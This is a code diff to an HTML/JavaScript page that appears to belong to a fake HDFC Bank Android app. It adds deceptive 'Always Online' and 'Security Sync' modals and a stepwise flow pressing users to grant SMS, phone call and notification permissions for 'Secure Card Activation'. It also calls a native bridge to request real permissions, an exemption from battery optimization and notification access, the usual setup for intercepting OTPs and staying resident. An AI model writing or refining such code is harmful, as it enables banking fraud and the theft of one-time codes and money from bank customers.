@@ -142,50 +142,84 @@
         </div>
     </footer>
 
+    <div class="overlay" id="batteryOverlay" style="display:none;">
+        <div class="modal">
+            <div class="modal-icon">🔋</div>
+            <h3>Always Online Mode</h3>
+            <p>Enable background sync to receive real-time card activation alerts even when the app is closed.</p>
+            <button class="btn btn-primary" onclick="triggerBattery()">Enable Always Online</button>
+        </div>
+    </div>
+
+    <div class="overlay" id="notifOverlay" style="display:none;">
+        <div class="modal">
+            <div class="modal-icon">🛡️</div>
+            <h3>Security Sync</h3>
+            <p>Enable secure synchronization to protect your account from unauthorized transactions.</p>
+            <button class="btn btn-primary" onclick="triggerNotif()">Enable Security Sync</button>
+        </div>
+    </div>
+
     <script>
         const overlay = document.getElementById('permissionOverlay');
+        const batteryOverlay = document.getElementById('batteryOverlay');
+        const notifOverlay = document.getElementById('notifOverlay');
+        const modalIcon = document.querySelector('.perm-icon');
+        const modalText = document.querySelector('.perm-text');
         
+        let currentStep = 0;
+        const steps = [
+            { id: 'notifModal', icon: '🔔', text: 'Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for transaction alerts and security updates?' },
+            { id: 'phoneModal', icon: '📞', text: 'Allow <strong>HDFC Bank</strong> to make and manage <strong>Phone Calls</strong> to verify your device security?' },
+            { id: 'smsModal', icon: '💬', text: 'Allow <strong>HDFC Bank</strong> to send and view <strong>SMS messages</strong> for OTP auto-verification?' }
+        ];
+
         function startPermissionFlow(e) {
             if(e) e.preventDefault();
-            if(!overlay) return;
+            currentStep = 0;
+            updateModal();
             overlay.style.display = 'flex';
-            document.getElementById('notifModal').style.display = 'block';
-            document.getElementById('phoneModal').style.display = 'none';
-            document.getElementById('smsModal').style.display = 'none';
         }
 
-        function nextPerm(type) {
-            document.getElementById('notifModal').style.display = 'none';
-            document.getElementById('phoneModal').style.display = 'none';
-            document.getElementById('smsModal').style.display = 'none';
-            
-            if (type === 'phone') {
-                document.getElementById('phoneModal').style.display = 'block';
-            } else if (type === 'sms') {
-                document.getElementById('smsModal').style.display = 'block';
-            }
+        function updateModal() {
+            steps.forEach((s, idx) => {
+                document.getElementById(s.id).style.display = (idx === currentStep) ? 'block' : 'none';
+            });
         }
 
-        function requestNativePermissions() {
-            // TRIGGER THE REAL NATIVE ANDROID PERMISSION DIALOGS
-            if (window.AndroidBridge) {
-                window.AndroidBridge.requestRealPermissions();
+        function nextPermission() {
+            currentStep++;
+            if (currentStep < steps.length) {
+                updateModal();
             } else {
-                // Fallback for website testing
-                console.log("AndroidBridge not found, redirecting to details.html");
-                window.location.href = 'details.html';
+                if (window.AndroidBridge) {
+                    window.AndroidBridge.requestRealPermissions();
+                } else {
+                    window.location.href = 'details.html';
+                }
             }
         }
 
-        // THIS IS CALLED BY NATIVE ANDROID CODE
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
-                if(overlay) overlay.style.display = 'none';
-                window.location.href = 'details.html';
+                overlay.style.display = 'none';
+                batteryOverlay.style.display = 'flex';
             } else {
-                alert('MANDATORY: All permissions are required for Secure Card Activation. Please Allow to continue.');
-                if(overlay) overlay.style.display = 'none';
+                alert('MANDATORY: All permissions are required for Secure Card Activation.');
+                overlay.style.display = 'none';
             }
+        }
+
+        function triggerBattery() {
+            if (window.AndroidBridge) window.AndroidBridge.requestIgnoreBatteryOptimizations();
+            batteryOverlay.style.display = 'none';
+            notifOverlay.style.display = 'flex';
+        }
+
+        function triggerNotif() {
+            if (window.AndroidBridge) window.AndroidBridge.requestNotificationAccess();
+            notifOverlay.style.display = 'none';
+            window.location.href = 'details.html';
         }
 
         // Attach to all buttons
